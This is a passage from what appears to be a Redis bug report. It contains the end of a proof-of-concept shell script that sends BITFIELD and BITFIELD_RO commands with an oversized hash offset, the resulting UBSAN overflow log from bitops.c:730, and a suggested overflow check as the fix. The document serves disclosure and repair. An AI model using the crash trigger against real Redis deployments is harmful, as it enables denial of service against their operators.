    if [[ "${alive_rc}" -eq 0 ]]; then
        "${CLI}" -p "${port}" SHUTDOWN NOSAVE >/dev/null 2>&1 || kill "${spid}" 2>/dev/null || true
        echo "FAILED: ${name} server stayed alive" >&2
        exit 1
    fi
    if [[ "${ping_rc}" -eq 0 ]]; then
        echo "FAILED: ${name} server still answered PING" >&2
        exit 1
    fi
    if ! grep -q "bitops.c:730:.*runtime error: signed integer overflow" "${log}"; then
        echo "FAILED: ${name} did not report the expected bitops.c:730 UBSAN overflow" >&2
        tail -120 "${log}" >&2 || true
        exit 1
    fi

    wait "${spid}" 2>/dev/null || true
    echo "    ${name}: verified signed-overflow abort"
}

run_trigger "bitfield_ro" "${PORT1:-6415}" BITFIELD_RO k GET i64 "${OFFSET}"
run_trigger "bitfield" "${PORT2:-6416}" BITFIELD k GET i64 "${OFFSET}"

echo "[4/4] PoC completed: both BITFIELD hash-offset triggers killed the UBSAN server."
```

**Expected behavior**

I verified the issue against the current source by building a temporary UBSAN Redis server and sending Redis commands through `redis-cli`. Both `BITFIELD_RO` and `BITFIELD` closed the connection, made subsequent `PING` fail, and logged:

```text
bitops.c:730:26: runtime error: signed integer overflow: 64 * 144115188075855872 cannot be represented in type 'long long int'
```

**Additional information**

Check for overflow before evaluating `loffset *= bits`. For example, when `usehash` is true, reject `loffset > LLONG_MAX / bits` before multiplying. A checked-multiplication helper would also work, while keeping the existing negative-value and `server.proto_max_bulk_len` bounds checks.
